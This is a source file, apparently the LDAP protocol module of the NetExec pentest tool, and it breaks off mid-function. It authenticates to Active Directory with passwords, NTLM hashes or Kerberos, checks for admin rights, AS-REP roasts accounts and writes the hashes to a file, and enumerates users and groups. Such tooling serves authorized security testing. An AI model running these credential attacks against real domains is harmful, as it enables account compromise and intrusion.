# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
import hashlib
import hmac
import os
import ldap3
import re
import socket
from binascii import hexlify
from datetime import datetime, timedelta
from re import sub, I
from zipfile import ZipFile
from termcolor import colored

from Cryptodome.Hash import MD4
from OpenSSL.SSL import SysCallError
from bloodhound.ad.authentication import ADAuthentication
from bloodhound.ad.domain import AD
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.samr import (
    UF_ACCOUNTDISABLE,
    UF_DONT_REQUIRE_PREAUTH,
    UF_TRUSTED_FOR_DELEGATION,
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
)
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
from impacket.krb5.types import Principal, KerberosException
from nxc.protocols.ldap import ldap3_patch
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldap import LDAPFilterSyntaxError
from impacket.smb import SMB_DIALECT
from impacket.smbconnection import SMBConnection, SessionError

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.logger import NXCAdapter, nxc_logger
from nxc.protocols.ldap.bloodhound import BloodHound
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.protocols.ldap.kerberos import KerberosAttacks
from nxc.parsers.ldap_results import parse_result_attributes

ldap_error_status = {
    "1": "STATUS_NOT_SUPPORTED",
    "533": "STATUS_ACCOUNT_DISABLED",
    "701": "STATUS_ACCOUNT_EXPIRED",
    "531": "STATUS_ACCOUNT_RESTRICTION",
    "530": "STATUS_INVALID_LOGON_HOURS",
    "532": "STATUS_PASSWORD_EXPIRED",
    "773": "STATUS_PASSWORD_MUST_CHANGE",
    "775": "USER_ACCOUNT_LOCKED",
    "50": "LDAP_INSUFFICIENT_ACCESS",
    "0": "LDAP Signing IS Enforced",
    "KDC_ERR_CLIENT_REVOKED": "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED": "KDC_ERR_PREAUTH_FAILED",
}


def resolve_collection_methods(methods):
    """Convert methods (string) to list of validated methods to resolve"""
    valid_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "default",
        "all",
        "loggedon",
        "objectprops",
        "experimental",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "dconly",
        "container",
    ]
    default_methods = ["group", "localadmin", "session", "trusts"]
    # Similar to SharpHound, All is not really all, it excludes loggedon
    all_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "objectprops",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "container",
    ]
    # DC only, does not collect to computers
    dconly_methods = ["group", "trusts", "objectprops", "acl", "container"]
    if "," in methods:
        method_list = [method.lower() for method in methods.split(",")]
        validated_methods = []
        for method in method_list:
            if method not in valid_methods:
                nxc_logger.error("Invalid collection method specified: %s", method)
                return False

            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
        return set(validated_methods)
    else:
        validated_methods = []
        # It is only one
        method = methods.lower()
        if method in valid_methods:
            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
            return set(validated_methods)
        else:
            nxc_logger.error("Invalid collection method specified: %s", method)
            return False


class ldap(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldapConnection = None
        self.lmhash = ""
        self.nthash = ""
        self.pfx = None
        self.key = None
        self.cert = None
        self.baseDN = ""
        self.target = ""
        self.targetDomain = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.admin_privs = False
        self.no_ntlm = False
        self.sid_domain = ""

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "LDAP",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def get_ldap_info(self, host):
        try:
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{host}"
            self.logger.info(f"Connecting to {ldap_url} with no baseDN")
            try:
                self.ldap_connection = ldap3_patch.LDAPConnection(ldap_url, dstIp=self.host)
                if self.ldap_connection:
                    self.logger.debug(f"ldap_connection: {self.ldap_connection}")
            except SysCallError as e:
                if proto == "ldaps":
                    self.logger.fail(f"LDAPs connection to {ldap_url} failed - {e}")
                    # https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority
                    self.logger.fail("Even if the port is open, LDAPS may not be configured")
                else:
                    self.logger.fail(f"LDAP connection to {ldap_url} failed: {e}")
                exit(1)

            self.ldap_connection.ldap_connection.search(
                search_scope=ldap3.BASE,
                attributes=["defaultNamingContext", "dnsHostName"],
                search_base='',
                search_filter='(objectClass=*)',
            )

            target = None
            target_domain = None
            base_dn = None

            try:
                base_dn = self.ldap_connection.ldap_connection.entries[0].defaultNamingContext.value
                target_domain = sub(
                                ",DC=",
                                ".",
                                base_dn[base_dn.lower().find("dc="):],
                                flags=I,
                            )[3:]
                target = self.ldap_connection.ldap_connection.entries[0].dnsHostName.value

            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.info(f"Skipping item, cannot process due to error {e}")

        except OSError:
            return [None, None, None]
        self.logger.debug(f"Target: {target}; target_domain: {target_domain}; base_dn: {base_dn}")
        return [target, target_domain, base_dn]

    def get_os_arch(self):
        try:
            string_binding = rf"ncacn_ip_tcp:{self.host}[135]"
            transport = DCERPCTransportFactory(string_binding)
            transport.setRemoteHost(self.host)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(
                    MSRPC_UUID_PORTMAP,
                    transfer_syntax=("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0"),
                )
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except Exception as e:
            self.logger.fail(f"Error retrieving os arch of {self.host}: {e!s}")

        return 0

    def get_ldap_username(self):

        who_am_i = self.ldapConnection.extend.standard.who_am_i()
        match = re.search(r'u:[^\\]+\\(.+)', who_am_i)
        if match:
            ldap_username = match.group(1)
            return ldap_username
        else:
            return ''

    def enum_host_info(self):
        self.target, self.targetDomain, self.baseDN = self.get_ldap_info(self.host)
        self.hostname = self.target
        self.remoteName = self.target
        self.domain = self.targetDomain
        # smb no open, specify the domain
        if not self.args.no_smb:
            self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

            try:
                self.conn.login("", "")
            except BrokenPipeError as e:
                self.logger.fail(f"Broken Pipe Error while attempting to login: {e}")
            except Exception as e:
                if "STATUS_NOT_SUPPORTED" in str(e):
                    self.no_ntlm = True
            if not self.no_ntlm:
                self.hostname = self.conn.getServerName()
                self.targetDomain = self.domain = self.conn.getServerDNSDomainName()
            self.server_os = self.conn.getServerOS()
            self.signing = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection["RequireSigning"]
            self.os_arch = self.get_os_arch()
            self.logger.extra["hostname"] = self.hostname

            if not self.domain:
                self.domain = self.hostname
            if self.args.domain:
                self.domain = self.args.domain
            if self.args.local_auth:
                self.domain = self.hostname
            self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.domain}"

            try:  # noqa: SIM105
                # DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                self.conn.logoff()
            except Exception:
                pass

            # Re-connect since we logged off
            self.create_conn_obj()

        if not self.kdcHost and self.domain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}".replace(":", "-"))

    def print_host_info(self):
        self.logger.debug("Printing host info for LDAP")
        if self.args.no_smb:
            self.logger.extra["protocol"] = "LDAP" if self.port == 389 else "LDAPS"
            self.logger.extra["port"] = self.port
            self.logger.display(f'{self.baseDN} (Hostname: {self.hostname.split(".")[0]}) (domain: {self.domain})')
        else:
            self.logger.extra["protocol"] = "SMB" if not self.no_ntlm else "LDAP"
            self.logger.extra["port"] = "445" if not self.no_ntlm else "389"
            signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=["bold"]) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=["bold"])
            smbv1 = colored(f"SMBv1:{self.smbv1}", host_info_colors[2], attrs=["bold"]) if self.smbv1 else colored(f"SMBv1:{self.smbv1}", host_info_colors[3], attrs=["bold"])
            self.logger.display(f"{self.server_os}{f' x{self.os_arch}' if self.os_arch else ''} (name:{self.hostname}) (domain:{self.targetDomain}) ({signing}) ({smbv1})")
            self.logger.extra["protocol"] = "LDAP"
        return True

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        self.username = username
        self.password = password
        self.domain = domain
        self.kdcHost = kdcHost
        self.aesKey = aesKey

        lmhash = ""
        nthash = ""
        self.username = username
        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
            self.hash = nthash
        else:
            nthash = ntlm_hash
            self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        kerb_pass = next(s for s in [self.nthash, password, aesKey] if s) if not all(s == "" for s in [self.nthash, password, aesKey]) else ""

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [1]")
            self.ldapConnection = ldap3_patch.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldapConnection.kerberosLogin(username, password, domain, self.lmhash, self.nthash, aesKey, kdcHost=kdcHost, useCache=useCache)
            if self.username == "":
                self.username = self.get_ldap_username()

            self.check_if_admin()

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.success(f"{domain}\\{self.username}{used_ccache} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except SessionKeyDecryptionError:
            # for PRE-AUTH account
            self.logger.success(
                f"{domain}\\{self.username}{' account vulnerable to asreproast attack'} {''}",
                color="yellow",
            )
            return False
        except SessionError as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.fail(
                f"{self.domain}\\{self.username}{used_ccache} {error!s}",
                color="magenta" if error in ldap_error_status else "red",
            )
            return False
        except (KeyError, KerberosException, OSError) as e:
            self.logger.fail(
                f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {e!s}",
                color="red",
            )
            return False
        except ldap3_patch.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [2]")
                    self.ldapConnection = ldap3_patch.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldapConnection.kerberosLogin(username, password, domain, self.lmhash, self.nthash, aesKey, kdcHost=kdcHost, useCache=useCache)
                    if self.username == "":
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except SessionError as e:
                    error, desc = e.getErrorString()
                    self.logger.fail(
                        f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {error!s}",
                        color="magenta" if error in ldap_error_status else "red",
                    )
                    return False
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if error_code in ldap_error_status else "red",
                    )
                    return False
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {error_code!s}",
                    color="magenta" if error_code in ldap_error_status else "red",
                )
                return False

    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [3]")
            self.ldapConnection = ldap3_patch.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap3_patch.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [4]")
                    self.ldapConnection = ldap3_patch.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
                    self.logger.fail("LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.")
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
                if proto == "ldaps":
                    self.logger.fail("LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.")
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        self.logger.extra["protocol"] = "LDAP"
        self.logger.extra["port"] = "389"
        lmhash = ""
        nthash = ""

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        self.username = username
        self.domain = domain

        if self.hash == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(f"{hash_tgt}\n")
            return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldaps_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host}")
            self.ldapConnection = ldap3_patch.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap3_patch.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                try:
                    # We need to try SSL
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"{proto}://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host}")
                    self.ldapConnection = ldap3_patch.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
                    self.logger.success(out)

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except ldap3_patch.LDAPSessionError as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
                    self.logger.fail("LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.")
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
                if proto == "ldaps":
                    self.logger.fail("LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.")
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def schannel_login(self, domain, username="", password="", pfx=None, key=None, cert=None):
        self.username = username
        self.password = password
        self.pfx = pfx
        self.key = key
        self.cert = cert
        self.domain = domain

        # if self.password == "" and self.args.asreproast:
        #     hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
        #     if hash_tgt:
        #         self.logger.highlight(f"{hash_tgt}")
        #         with open(self.args.asreproast, "a+") as hash_asreproast:
        #             hash_asreproast.write(f"{hash_tgt}\n")
        #     return False

        try:
            # Connect to LDAP
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            ldap_url = f"{proto}://{self.target}"
            self.logger.info(f"Connecting to {ldap_url} - {self.baseDN} - {self.host} [3]")
            self.ldapConnection = ldap3_patch.LDAPConnection(url=ldap_url, baseDN=self.baseDN, dstIp=self.host)
            self.ldapConnection.schannelLogin(self.username, self.domain, self.pfx, self.key, self.cert)

            self.who_am_i = self.ldapConnection.ldap_connection.extend.standard.who_am_i()
            self.username = self.who_am_i.split("\\")[-1]

            if not self.who_am_i:
                print('Certificate authentication failed') 
                return False
    
            self.check_if_admin()

            # Prepare success credential text
            self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap3_patch.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    ldaps_url = f"ldaps://{self.target}"
                    self.logger.info(f"Connecting to {ldaps_url} - {self.baseDN} - {self.host} [4]")
                    self.ldapConnection = ldap3_patch.LDAPConnection(url=ldaps_url, baseDN=self.baseDN, dstIp=self.host)
                    self.ldapConnection.schannelLogin(self.username, self.domain, self.pfx, self.key, self.cert)
                    
                    self.who_am_i = self.ldapConnection.ldap_connection.extend.standard.who_am_i()
                    self.username = self.who_am_i.split("\\")[-1]

                    if not self.who_am_i:
                        print('Certificate authentication failed')
                        return False

                    self.check_if_admin()

                    # Prepare success credential text
                    self.logger.success(f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")

                    if not self.args.local_auth and self.username != "":
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
                    self.logger.fail("LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.")
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
                if proto == "ldaps":
                    self.logger.fail("LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.")
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def create_smbv1_conn(self):
        self.logger.debug("Creating smbv1 connection object")
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445, preferredDialect=SMB_DIALECT)
            self.smbv1 = True
            if self.conn:
                self.logger.debug("SMBv1 Connection successful")
        except OSError as e:
            if str(e).find("Connection reset by peer") != -1:
                self.logger.debug(f"SMBv1 might be disabled on {self.host}")
            return False
        except Exception as e:
            self.logger.debug(f"Error creating SMBv1 connection to {self.host}: {e}")
            return False
        return True

    def create_smbv3_conn(self):
        self.logger.debug("Creating smbv3 connection object")
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445)
            self.smbv1 = False
            if self.conn:
                self.logger.debug("SMBv3 Connection successful")
        except OSError:
            return False
        except Exception as e:
            self.logger.debug(f"Error creating SMBv3 connection to {self.host}: {e}")
            return False

        return True

    def create_conn_obj(self):
        return bool(self.args.no_smb or self.create_smbv1_conn() or self.create_smbv3_conn())

    def get_sid(self):
        self.logger.highlight(f"Domain SID {self.sid_domain}")

    def sid_to_str(self, sid):
        try:
            # revision
            revision = int(sid[0])
            # count of sub authorities
            sub_authorities = int(sid[1])
            # big endian
            identifier_authority = int.from_bytes(sid[2:8], byteorder="big")
            # If true then it is represented in hex
            if identifier_authority >= 2**32:
                identifier_authority = hex(identifier_authority)

            # loop over the count of small endians
            sub_authority = "-" + "-".join([str(int.from_bytes(sid[8 + (i * 4): 12 + (i * 4)], byteorder="little")) for i in range(sub_authorities)])
            return "S-" + str(revision) + "-" + str(identifier_authority) + sub_authority
        except Exception:
            pass
        return sid

    def check_if_admin(self):
        # 1. get SID of the domaine
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
        attributes = ["objectSid"]
        resp = self.search(search_filter, attributes, sizeLimit=0)
        answers = []
        if resp and (self.password != "" or self.lmhash != "" or self.nthash != "" or self.pfx != None or (self.key and self.cert != None)) and self.username != "":
            for entry in resp:
                if 'attributes' in entry and 'objectSid' in entry['attributes']:
                    if isinstance(entry['attributes']['objectSid'], list):
                        object_sid_bytes = entry['attributes']['objectSid'][0]
                    else:
                        object_sid_bytes = entry['attributes']['objectSid']
            sid = self.sid_to_str(object_sid_bytes)
            self.sid_domain = "-".join(sid.split("-")[:-1])

            # 2. get all group cn name
            search_filter = "(|(objectSid=" + self.sid_domain + "-512)(objectSid=" + self.sid_domain + "-544)(objectSid=" + self.sid_domain + "-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
            attributes = ["distinguishedName"]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            for entry in resp:
                # answers.append(str("(memberOf:1.2.840.113556.1.4.1941:=" + entry + ")"))
                if 'attributes' in entry and 'distinguishedName' in entry['attributes']:
                    if isinstance(entry['attributes']['distinguishedName'], list):
                        distinguished_name = entry['attributes']['distinguishedName'][0]
                    else:
                        distinguished_name = entry['attributes']['distinguishedName']
                    answers.append(f"(memberOf:1.2.840.113556.1.4.1941:={distinguished_name})")

            # 3. get member of these groups
            search_filter = "(&(objectCategory=user)(sAMAccountName=" + self.username + ")(|" + "".join(answers) + "))"
            attributes = ["*"]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            for item in resp:
                if item:
                    self.admin_privs = True

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def search(self, search_filter, attributes, sizeLimit=0):
        try:
            if self.ldapConnection:
                self.logger.debug(f"Search Filter={search_filter}")

                return self.ldapConnection.search(
                    search_filter=search_filter,
                    attributes=attributes,
                    sizeLimit=sizeLimit
                )
        except Exception as e:
            self.logger.fail(e)
            return False
        return False

    def users(self):
        """
        Retrieves user information from the LDAP server.

        Args:
        ----
            input_attributes (list): Optional. List of attributes to retrieve for each user.

        Returns:
        -------
            None
        """
        if len(self.args.users) > 0:
            self.logger.debug(f"Dumping users: {', '.join(self.args.users)}")
            search_filter = f"(|{''.join(f'(sAMAccountName={user})' for user in self.args.users)})"
        else:
            self.logger.debug("Trying to dump all users")
            search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"

        # default to these attributes to mirror the SMB --users functionality
        request_attributes = ["sAMAccountName", "description", "badPwdCount", "pwdLastSet"]
        resp = self.search(search_filter, request_attributes, sizeLimit=0)

        if resp:
            # I think this was here for anonymous ldap bindings, so I kept it, but we might just want to remove it
            if self.username == "":
                self.logger.display(f"Total records returned: {len(resp):d}")
                for item in resp:
                    if item["type"] != "searchResEntry":
                        continue
                    self.logger.highlight(f"{item['objectName']}")
                return

            users = parse_result_attributes(resp)

            # users = []
            # for entry in resp:
            #     # SearchResultReferences may be returned
            #     if entry["type"] != "searchResEntry":
            #         continue
            #     attribute_map = {}
            #     for attribute in entry["attributes"]:
            #         if isinstance(entry['attributes'][attribute], list):
            #             attribute_map[str(attribute)] = str(entry['attributes'][attribute][0]) if entry['attributes'][attribute] != [] else ""
            #         else:
            #             attribute_map[str(attribute)] = str(entry['attributes'][attribute])
            #     users.append(attribute_map)

            # we print the total records after we parse the results since often SearchResultReferences are returned
            self.logger.display(f"Enumerated {len(users):d} domain users: {self.domain}")
            self.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<8}{'-Description-':<60}")
            for user in users:
                pwd_last_set = user.get("pwdLastSet", "")
                pwd_last_set = pwd_last_set[:19]
                if pwd_last_set == "1601-01-01 00:00:00":
                    pwd_last_set = "<never>"
                # we default attributes to blank strings if they don't exist in the dict
                self.logger.highlight(f"{user.get('sAMAccountName', ''):<30}{pwd_last_set:<20}{user.get('badPwdCount', ''):<8}{user.get('description', ''):<60}")

    def groups(self):
        # Building the search filter
        search_filter = "(objectCategory=group)"
        attributes = ["name"]
        resp = self.search(search_filter, attributes, 0)
        if resp:
            self.logger.debug(f"Total of records returned {len(resp):d}")

            for item in resp:
